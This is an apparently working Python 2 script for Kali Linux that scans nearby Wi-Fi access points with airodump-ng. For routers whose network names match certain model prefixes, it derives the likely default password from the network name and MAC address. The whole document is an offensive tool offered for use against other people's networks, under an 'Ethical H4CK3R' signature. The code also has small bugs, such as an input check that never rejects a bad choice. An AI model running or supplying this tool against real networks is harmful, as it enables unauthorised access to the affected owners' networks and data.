#!/usr/bin/env python27
#
# This Program Is Written For Kali Linux 2.0
# 
# TODO Scan For Default Networks Name; Guesses The Default Password Of The Network
#
# Disclaimer: Not Really Cracking Password, It's Just Guessing It
#
# - Ethical H4CK3R

from os import devnull,mkdir,getuid,listdir,path,chdir,getcwd,remove
from subprocess import call,Popen
from shutil import rmtree
from time import sleep
from csv import reader
from sys import argv

class Engine(object):
  def __init__(self,iface,folder):
    self.fold = folder
    self.wlan = iface
    self.macs = []
    self.ssid = [] 
    self.chan = []
    self.powe = []
    self.num  = 0
    self.time = 5

  def Monitor_Mode(self):
    call(['ifconfig',self.wlan,'down'])
    call(['iwconfig',self.wlan,'mode','monitor'])
    call(['ifconfig',self.wlan,'up'])
    call(['service','network-manager','stop'])

  def Managed_Mode(self):
    call(['ifconfig',self.wlan,'down'])
    call(['iwconfig',self.wlan,'mode','managed'])
    call(['ifconfig',self.wlan,'up'])
    call(['service','network-manager','start'])

  def Scan(self):
    cmd = ['airodump-ng','-a','--output-format', 'csv', '-w','list'.format(self.fold),self.wlan]
    scan = Popen(cmd,stderr=Devnull,stdout=Devnull)
    sleep(self.time)
    call(['pkill', 'airodump-ng'])
    self.Display()

  def Display(self):
    info = 'list-01.csv'
    with open(info, 'r') as AccessPoints:
     Data = reader(AccessPoints, delimiter=',')
     for line in Data:
      if len(line) >= 10:
       try:
        power = (str(line[8]).strip())
        name  = (str(line[13]).strip())
        chan  = (str(line[3]).strip())
        bssid = (str(line[0]).strip())
 
        if name != 'ESSID' and power != 'PWR'.strip() and power != '-1' and len(name) != 0:
         if len(name) > 9: 
          name = name[:9]
          
         if not self.num:
          call(['clear']) 
          print ('Num\tPower\tChan\tEssid\n')
          self.num+=1
        
         if bssid not in self.macs and self.num:
          print ('{}\t{}\t{}\t{}'.format(self.num,power,chan,name))
          self.macs.append(bssid)
          self.ssid.append(name)
          self.chan.append(chan)
          self.powe.append(power)
          self.num+=1
          sleep(0.4)

       except:pass
       finally:
        for item in listdir('.'):
         try:remove(item)
         except: pass
  
  def Logic_Bomb(self):
    global Powers,Chans,Essids,Bssids
    Powers = self.powe
    Essids = self.ssid
    Bssids = self.macs
    Chans  = self.chan

  def Clean(self):
    try:
     self.Managed_Mode()
     path = getcwd()
     chdir('/root')
     rmtree(path)
    except:pass
    finally:
     print ('\n')
    
def ReGenerate(ssids,powers,chans):
 i,size=0,len(ssids)
 call(['clear'])

 for ssid,Power,Channel in zip(ssids,powers,chans):
  if not i:
    print ('Num\tPower\tChan\tEssid\n');i+=1
 
  if i:
   print ('{}\t{}\t{}\t{}'.format(i,Power,Channel,ssid))
   i+=1
   
def Create(name):
  if path.exists(name):
   if path.isdir(name):
    rmtree(name)
    return mkdir(name)
  else:
   return mkdir(name)

def Analyze(essid):
  global Essid

  Type = essid[:3]
  Builds = ['TG1','DVW','DG8','U10','TC8']

  if Type in Builds: 
   if Type == Builds[0] and str(essid[-3:]).upper() == str('-5G'):
    Essid = essid[:-3]
   return True
  else:
   return False

def Guess(essid,bssid):
  a,b,c = essid[:-2],[],essid[-2:]
  for i,k in enumerate(bssid):
   if i == 9 or i == 10 or i == 12 or i == 13:
    b.append(k)
   else:
    continue
  
  password = '{}{}{}'.format(a,''.join(b),c)
  return password
 
def Main(iface):
  global Devnull,Essid
  Devnull = open(devnull, 'w')

  Filename = str(path.splitext(argv[0])[0])
  Create(Filename)
  chdir(Filename)

  engine = Engine(iface,Filename)
  engine.Monitor_Mode()
  call(['clear'])
  print '[-] Loading...'

  while 1:
   try:
    engine.Scan()
   except KeyboardInterrupt:
    cmd = ['pkill','airodump-ng']
    Popen(cmd,stderr=Devnull,stdout=Devnull)
    engine.Logic_Bomb()
    break
  
  index = int(input('\n\n[-] Enter Intended Num: '))
  if index > len(Essids) or index <= 0:
   while 1:
    call(['clear'])
    ReGenerate(Essids,Powers,Chans)
    index = int(input('\n\n[-] Enter Intended Num: '))
    if index <= len(Essids) or index > 0:
     break

  if not Analyze(str(Essids[index-1])):
   while 1:
    call(['clear'])
    ReGenerate(Essids,Powers,Chans)
    index = int(input('\n\n[-] Enter Intended Num: '))
    if index <= len(Essids) or index > 0:
     if Analyze(str(Essids[index-1])):
      break
    
  Essid = str(Essids[index-1])
  Bssid = str(Bssids[index-1])

  call(['clear']) 
  print ('\n')
  print ('[+] Possible Password: {}'.format(Guess(Essid,Bssid))) 
  engine.Clean()
   
if __name__ == '__main__':
  if not getuid():
   try:
    iface = raw_input('[-] Enter Interface: ')
    if len(iface) == 0: 
     exit()
    Main(iface)
   except KeyboardInterrupt: 
    call(['clear'])
    print ('[+] Exiting...')
    Engine(iface,None).Clean()
  else:
   exit('[!] Root Access Required')
